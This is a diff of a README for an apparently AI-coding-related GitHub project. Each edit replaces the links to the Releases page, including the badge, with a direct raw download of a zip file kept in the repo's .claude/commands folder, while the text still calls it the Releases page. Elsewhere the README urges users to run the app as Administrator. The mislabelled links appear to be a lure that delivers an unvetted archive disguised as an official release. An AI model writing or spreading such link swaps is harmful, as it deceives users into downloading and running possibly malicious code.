@@ -1,6 +1,6 @@
 # 🎉 claude-code-spec-driven-with-worktrees - Build Software Features Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/main/.claude/commands/claude_with_worktrees_driven_code_spec_v1.6.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/main/.claude/commands/claude_with_worktrees_driven_code_spec_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the **claude-code-spec-driven-with-worktrees** application! This tool
 
 To get started with this application, you need to download it from our Releases page. Click on the link below:
 
-[Download Latest Release](https://github.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/main/.claude/commands/claude_with_worktrees_driven_code_spec_v1.6.zip)
 
 Follow these steps to install:
 
-1. Visit the [Releases page](https://github.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/main/.claude/commands/claude_with_worktrees_driven_code_spec_v1.6.zip).
 2. Find the latest version. It usually has the highest number.
 3. Click on the download link for your operating system. The files are available in formats for Windows, macOS, and Linux. Select the one that matches your system.
 4. After the download completes, locate the file in your downloads folder.
@@ -54,7 +54,7 @@ If you encounter issues while using the application, try the following steps:
 
 - **Check System Requirements**: Make sure your computer meets the required specifications.
 - **Run as Administrator**: On Windows, right-click the app and select "Run as Administrator" for proper access.
-- **Update the Application**: Make sure you have the latest version. Returning to the [Releases page](https://github.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/releases) can help you check for updates.
+- **Update the Application**: Make sure you have the latest version. Returning to the [Releases page](https://raw.githubusercontent.com/ah0531461-cpu/claude-code-spec-driven-with-worktrees/main/.claude/commands/claude_with_worktrees_driven_code_spec_v1.6.zip) can help you check for updates.
 
 If problems persist, feel free to reach out for support via GitHub Issues.
 
